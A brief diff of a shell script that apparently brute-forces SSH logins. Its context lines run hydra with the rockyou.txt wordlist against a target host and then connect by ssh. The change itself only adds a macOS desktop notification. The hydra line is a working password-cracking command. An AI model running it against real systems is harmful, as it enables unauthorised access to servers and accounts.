@@ -159,7 +159,11 @@ else
 
                         # Crack SSH password
                         hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
+                        
                         echo "Connecting to $user@$host"
+                        title="Connecting to ${user}"
+                        Connecting_To_SSH_SERVER="We are connecting you to ${user} plase wait..."
+                        osascript -e "display notification \"$Connecting_To_SSH_SERVER\" with title \"$title\""
                         sleep 3
                         ssh $user@$host
                     fi
